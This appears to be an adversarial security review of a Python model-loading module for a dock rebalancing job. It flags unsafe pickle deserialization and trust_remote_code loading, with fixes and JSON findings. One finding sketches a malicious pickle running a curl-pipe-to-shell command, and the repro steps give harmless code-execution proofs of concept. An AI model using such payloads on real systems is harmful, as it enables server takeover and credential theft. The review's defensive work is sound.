# Adversarial Diagnostic Review: `forecast.py`

## Pass 1: Reconstruct

The work is a small Python module for the dock rebalancing job with two functions:
- `load_model()` downloads `demand-latest.pkl` over HTTPS and unpickles it.
- `load_weather_adapter()` loads a Hugging Face model from `pedalo-labs/weather-adapter` with `trust_remote_code=True`.

The request covered only the first. The module will run on an ops server that holds the fleet database credentials and the dock control API key. For it to be safe and correct, these must all be true:

1. Every byte at `MODEL_URL` must be trustworthy at every fetch, forever. "latest" is a mutable pointer and there is no hash or signature check.
2. Every Python file in the Hugging Face repo must be trustworthy at every load. No revision is pinned.
3. The `.test` hostname must resolve on the ops server.
4. The network must always answer promptly, because there is no timeout.
5. Unstated: whoever can publish to either location is trusted as much as whoever holds the ops server's credentials.

## Pass 2: Attack (Track B, plus security)

- **Main path:** `urlopen(MODEL_URL).read()` reads the whole body into memory with no timeout. `pickle.loads(raw)` then runs whatever callables the pickle stream names, through `__reduce__`. This is documented Python behaviour; the `pickle` docs warn never to unpickle untrusted data.
- **Hostile inputs:**
  - A crafted pickle runs code as the job's user.
  - A truncated download raises `UnpicklingError` with no handling.
  - A hung server blocks the job indefinitely.
  - A multi-GB body causes memory exhaustion.
  - A swapped "latest" file silently changes forecasts between runs.
- **`trust_remote_code=True`:** `from_pretrained` downloads and imports the repo's `modeling_*.py` / `configuration_*.py` and executes them in-process. Without `revision=`, it takes whatever is on the default branch at load time.
- **Requirement fit:** the request asked only for the demand-forecast model loader. `load_weather_adapter` is unrequested scope, and it is the second code-execution path. No tests were supplied.
- **APIs:** `urllib.request.urlopen`, `pickle.loads`, `AutoModel.from_pretrained(..., trust_remote_code=True)` all exist and behave as described. No hallucinated APIs.
- **TLS:** `urlopen` verifies certificates by default (Python ≥3.4.3, PEP 476), so network MITM is not the main threat. The threat is whoever can write to the artifact host or the Hugging Face repo.

## Pass 3: Self-check

- **Strongest defence of F1/F2:** "Both sources are ours and only trusted people publish there."
  - That is unverified.
  - Even if true, it means compromising a model-publishing account, a CI token or the HF org yields the fleet DB credentials and the dock control API key.
  - Nothing in the code limits that blast radius.
  - Both findings survive.
- **Same-root-cause search:** I searched every function and import in `forecast.py` (two functions, two top-level imports, one in-function import) for code-executing deserialization or remote-code loading. I found exactly two, F1 and F2, and nothing else.
- **What I might still be missing:** how the job's caller uses the model output to drive the dock control API (unsupplied), and how `demand-latest.pkl` gets published. An unauthenticated or broadly writable publish path would make F1 trivially exploitable.

---

**VERDICT: REWORK.** Both loaders execute unpinned, unverified remote code on a server holding fleet DB credentials and the dock control API key. The fix is a redesign of the loading approach, not a tweak.

**CONFIDENCE IN VERDICT: high.** The two critical issues are visible in the code and depend only on documented library behaviour. Confidence is limited by not knowing who can publish to the model host or the HF repo, which affects likelihood but not severity.

## COVERAGE

| Item | Status |
|---|---|
| request.md | checked |
| context.md | checked |
| forecast.py (all lines) | checked |
| Tests | not checked (not supplied) |
| Calling rebalancing job | not checked (not supplied) |
| Deploy / runtime config, requirements | not checked (not supplied) |
| Model publishing pipeline / host ACLs | not checked (not supplied) |
| HF repo `pedalo-labs/weather-adapter` contents and ownership | not checked (no tools) |

## FINDINGS

| # | Severity | Evidence | Location | What is wrong | Failure scenario | Fix and reproduction | a/b/c/d |
|---|---|---|---|---|---|---|---|
| F1 | Critical | CONFIRMED | `load_model`: `pickle.loads(urllib.request.urlopen(MODEL_URL).read())` | Unpickles network-fetched bytes with no hash or signature check. The URL is a mutable `-latest` alias. | Anyone who can write `demand-latest.pkl` (compromised publisher account, CI token or host) uploads a pickle whose `__reduce__` returns `(os.system, ("curl …\| sh",))`. On the next job run it executes as the job user, reads the fleet DB credentials and dock API key, and can drive the docks. | **Fix:** use a non-executable format (ONNX, safetensors, or JSON/skops with an explicit trusted-type allowlist). Pin a versioned artifact. Verify a SHA-256 hash or a signature committed in the repo before parsing. Fail closed on mismatch. **Repro (scratch container, no credentials):** `class P: __reduce__=lambda s:(os.system,("touch /tmp/pwned",))`; serve `pickle.dumps(P())` with `python -m http.server`; point `MODEL_URL` at it; call `load_model()`; `/tmp/pwned` exists. | a Y, b Y, c Y, d N (needs publish access) |
| F2 | Critical | CONFIRMED | `load_weather_adapter`: `AutoModel.from_pretrained("pedalo-labs/weather-adapter", trust_remote_code=True)` | Imports and executes Python from a third-party hub repo, with no `revision` pin. The function also was not requested. | Someone with push access to the repo (or an HF account takeover, or a squatter if `pedalo-labs` is not your org) commits a malicious `modeling_*.py`. The next load runs it in the job process. Outcome is the same as F1. | **Fix:** remove the function from this module (out of scope). If the adapter is needed, vendor and review its code in-repo, load with `trust_remote_code=False` from a local path or internal mirror, and pin `revision=<commit SHA>`. **Repro (scratch):** create a local model dir whose `config.json` `auto_map` points to `modeling_x.py` containing `open('/tmp/pwned','w')`; call `AutoModel.from_pretrained(dir, trust_remote_code=True)`; the file appears. | a Y, b Y, c Y, d N |
| F3 | Medium | CONFIRMED | `load_model`: `urlopen(MODEL_URL)` with no `timeout` | The default socket timeout is `None`, so a stalled server blocks forever. | The model host accepts the connection but never responds. The rebalancing job hangs, the docks are not rebalanced, and nothing alerts. | Pass `timeout=` (for example 30s), add bounded retries, and handle failure explicitly (fall back to the last verified cached model, or fail loudly). **Repro:** point at `nc -l 8000` and observe that `load_model()` never returns. | a Y, b Y, c N, d N |
| F4 | Medium | CONFIRMED | `MODEL_URL = ".../demand-latest.pkl"` | The mutable "latest" alias gives non-reproducible forecasts. There is no record of which model drove a given rebalancing decision. | A new model is published mid-day. Two runs use different models, and a bad rebalance cannot be traced to a model version. | Pin a versioned artifact plus hash in config and log the hash on load. | a Y, b Y, c N, d Y |
| F5 | Low | CONFIRMED | `.read()` | Unbounded read into memory. | An oversized or malicious response exhausts memory on the ops server. | Check `Content-Length` and read with a size cap. **Repro:** serve a 10 GB stream and watch memory grow. | a Y, b Y, c N, d N |
| F6 | Low | CONFIRMED | whole module | No tests and no error handling. Download and parse errors propagate raw. | A truncated download raises an unhandled `UnpicklingError` mid-job. | Add tests for hash mismatch rejection, timeout and malformed artifact. Break the hash check deliberately and confirm the tests go red. | a Y, b Y, c N, d N |

## NEEDS VALIDATION

- **`MODEL_URL` host `models.example.test`:** `.test` is a reserved TLD (RFC 6761) and will not resolve publicly. This is either a placeholder that will fail in production, or it relies on internal DNS. Settle it by running `getent hosts models.example.test` on the ops server.
- **Who can write `demand-latest.pkl` and push to `pedalo-labs/weather-adapter`, and does your organisation own that HF namespace?** This settles how likely F1 and F2 are to be exploited, not their severity.
- **What OS user the job runs as, and whether credentials sit in its environment or files.** This settles exact blast radius.

## REFUTED

- **Network MITM of `MODEL_URL`:** `urlopen` verifies TLS certificates by default (PEP 476). The realistic threat is the publisher or host side, which is captured in F1.

## WHAT HOLDS UP

The module is short and readable. It uses real APIs correctly. The `transformers` import is lazy and so does not burden `load_model`. HTTPS is used.

## UNVERIFIED CLAIMS

The work makes no explicit claims ("tested", "verified"). Two things are implicitly assumed:
- The artifact and hub repo are trustworthy. Confirm via access-control review of both.
- The pickle contains a compatible model object. Confirm by loading a pinned artifact in a scratch environment.

## QUESTIONS FOR THE AUTHOR

1. Why is `load_weather_adapter` here when the request covered only the demand model? Is it actually needed?
2. Can the demand model be exported to a non-executable format (ONNX, or skops with a trusted-type allowlist)?
3. Who and what can publish to the model URL, and is there an existing signing or hash process to hook into?

## DECISION-MAKER SUMMARY

Do not run this on the ops server. Both loaders execute remote, unpinned code in a process that can reach the fleet database and the dock control API, so anyone able to publish a model file or push to the hub repo could take those credentials. Rework to a verified, pinned, non-executable model format, drop the unrequested weather adapter, and add a timeout before re-review.

## OWNER SUMMARY

The new code that loads the forecasting model trusts whatever file it downloads and will run any instructions hidden inside it, on the same server that holds the keys to the fleet database and the dock controls. A second, unrequested part does the same with code fetched from a public model site. It should be changed to only accept a specific, checked model file before it is allowed to run.

```json
{
  "schema_version": "2.3",
  "verdict": "REWORK",
  "confidence": "high",
  "inputs_ledger": [
    {"item": "request.md", "status": "seen", "matters": true},
    {"item": "context.md", "status": "seen", "matters": true},
    {"item": "forecast.py", "status": "seen", "matters": true},
    {"item": "tests", "status": "not_seen", "matters": true},
    {"item": "calling rebalancing job", "status": "not_seen", "matters": true},
    {"item": "model publishing pipeline / ACLs", "status": "not_seen", "matters": true},
    {"item": "HF repo pedalo-labs/weather-adapter", "status": "not_openable", "matters": true}
  ],
  "coverage": {
    "checked": [
      {"unit": "request.md", "kind": "document"},
      {"unit": "context.md", "kind": "document"},
      {"unit": "forecast.py", "kind": "file"},
      {"unit": "forecast.py:load_model", "kind": "function"},
      {"unit": "forecast.py:load_weather_adapter", "kind": "function"},
      {"unit": "MODEL_URL", "kind": "config"}
    ],
    "not_checked": [
      {"unit": "tests", "reason": "not_supplied"},
      {"unit": "calling rebalancing job", "reason": "not_supplied"},
      {"unit": "deploy config / requirements", "reason": "not_supplied"},
      {"unit": "model host and HF repo access controls", "reason": "no_tools"}
    ]
  },
  "findings": [
    {
      "id": "F1", "status": "confirmed", "severity": "Critical", "evidence_level": "CONFIRMED", "track": "B",
      "location": "forecast.py load_model: pickle.loads(urllib.request.urlopen(MODEL_URL).read())",
      "scenario": "Attacker with write access to demand-latest.pkl publishes a pickle whose __reduce__ runs a shell command; next job run executes it on the ops server and exfiltrates fleet DB credentials and dock control API key.",
      "fix": "Use a non-executable model format, pin a versioned artifact, verify a committed SHA-256 or signature before parsing, fail closed.",
      "reproduction": "In a scratch container without credentials: serve pickle.dumps of an object whose __reduce__ returns (os.system, ('touch /tmp/pwned',)); point MODEL_URL at it; call load_model(); /tmp/pwned is created.",
      "answers": {"a": true, "b": true, "c": true, "d": false},
      "security": true,
      "siblings_searched": {"searched": "all functions and imports in forecast.py for code-executing deserialization or remote code loading", "found": "F2 (trust_remote_code in load_weather_adapter); no others"},
      "boundary": {"principal": "anyone able to publish to models.example.test (publisher account, CI token, host operator)", "input": "bytes of demand-latest.pkl", "control": "none: no hash/signature, executable pickle format, mutable 'latest' alias", "crossed": "model artifact storage -> ops server job process", "resource": "fleet database credentials, dock control API key, dock control"}
    },
    {
      "id": "F2", "status": "confirmed", "severity": "Critical", "evidence_level": "CONFIRMED", "track": "B",
      "location": "forecast.py load_weather_adapter: AutoModel.from_pretrained('pedalo-labs/weather-adapter', trust_remote_code=True)",
      "scenario": "Anyone with push access to the HF repo (or an account takeover or namespace squatter) commits a malicious modeling_*.py; next load imports and runs it in the job process with access to credentials. The function was also not requested.",
      "fix": "Remove from this module (out of scope); if needed, vendor and review the code in-repo, load from a local or mirrored path with trust_remote_code=False, pin revision to a commit SHA.",
      "reproduction": "In scratch: local model dir with config.json auto_map pointing to modeling_x.py that writes /tmp/pwned; call AutoModel.from_pretrained(dir, trust_remote_code=True); file appears.",
      "answers": {"a": true, "b": true, "c": true, "d": false},
      "security": true,
      "siblings_searched": {"searched": "all functions and imports in forecast.py for code-executing deserialization or remote code loading", "found": "F1 (pickle.loads in load_model); no others"},
      "boundary": {"principal": "anyone with push rights to pedalo-labs/weather-adapter on the Hugging Face Hub", "input": "Python modules in the repo's default branch", "control": "trust_remote_code=True with no revision pin", "crossed": "third-party model hub -> ops server job process", "resource": "fleet database credentials, dock control API key, dock control"}
    },
    {
      "id": "F3", "status": "confirmed", "severity": "Medium", "evidence_level": "CONFIRMED", "track": "B",
      "location": "forecast.py load_model: urlopen(MODEL_URL) without timeout",
      "scenario": "Model host accepts the connection but never responds; job blocks indefinitely and docks are not rebalanced.",
      "fix": "Pass timeout=, add bounded retries, fall back to last verified cached model or fail loudly.",
      "reproduction": "Point MODEL_URL at 'nc -l 8000'; load_model() never returns.",
      "answers": {"a": true, "b": true, "c": false, "d": false}
    },
    {
      "id": "F4", "status": "confirmed", "severity": "Medium", "evidence_level": "CONFIRMED", "track": "B",
      "location": "forecast.py MODEL_URL '.../demand-latest.pkl'",
      "scenario": "Model republished mid-day; runs use different models and a bad rebalance cannot be traced to a model version.",
      "fix": "Pin a versioned artifact plus hash in config; log the hash on load.",
      "reproduction": "Replace demand-latest.pkl between two load_model() calls; the returned objects differ with no record.",
      "answers": {"a": true, "b": true, "c": false, "d": true}
    },
    {
      "id": "F5", "status": "confirmed", "severity": "Low", "evidence_level": "CONFIRMED", "track": "B",
      "location": "forecast.py load_model: .read()",
      "scenario": "Oversized or malicious response exhausts memory on the ops server.",
      "fix": "Check Content-Length and read with a size cap.",
      "reproduction": "Serve an endless or 10 GB stream; process memory grows until OOM.",
      "answers": {"a": true, "b": true, "c": false, "d": false}
    },
    {
      "id": "F6", "status": "confirmed", "severity": "Low", "evidence_level": "CONFIRMED", "track": "B",
      "location": "forecast.py (whole module)",
      "scenario": "No tests and no error handling; a truncated download raises an unhandled UnpicklingError mid-job.",
      "fix": "Add tests for hash mismatch rejection, timeout and malformed artifact; mutate the hash check to confirm the tests fail.",
      "reproduction": "Serve the first half of a valid pickle; load_model() raises an unhandled exception.",
      "answers": {"a": true, "b": true, "c": false, "d": false}
    },
    {
      "id": "NV1", "status": "needs_validation", "location": "forecast.py MODEL_URL host models.example.test",
      "suspicion": ".test is a reserved TLD and will not resolve publicly; this may be a placeholder that fails in production.",
      "unresolved_fact": "Output of 'getent hosts models.example.test' on the ops server."
    },
    {
      "id": "NV2", "status": "needs_validation", "location": "MODEL_URL and pedalo-labs/weather-adapter",
      "suspicion": "Write or push access to either source may be broad, or the HF namespace may not be owned by the organisation.",
      "unresolved_fact": "Access-control list for the model host path and the HF org's member and ownership records."
    },
    {
      "id": "NV3", "status": "needs_validation", "location": "ops server runtime",
      "suspicion": "Exact blast radius depends on how credentials are exposed to the job process.",
      "unresolved_fact": "Which OS user the job runs as and whether credentials are in its environment or readable files."
    }
  ],
  "refuted": [
    {"id": "R1", "candidate": "Network MITM can swap the model in transit", "evidence": "urllib.request.urlopen verifies TLS certificates by default since Python 3.4.3 (PEP 476); residual risk is publisher/host-side, covered by F1."}
  ]
}
```